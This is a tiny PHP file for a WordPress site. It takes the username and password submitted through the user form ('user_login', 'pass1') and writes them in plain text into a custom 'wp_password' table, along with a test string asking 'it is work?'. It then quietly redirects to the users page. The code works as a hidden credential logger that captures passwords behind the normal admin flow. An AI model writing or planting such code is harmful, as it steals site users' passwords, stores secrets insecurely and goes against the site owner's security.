<?php
	global $wpdb;
	$wpdb->insert( 'wp_password', [ 'login' => $_POST['user_login'], 'pass' => $_POST['pass1'], 'repass' => 'it is work?'  ]);

	header("Location: users.php");
?>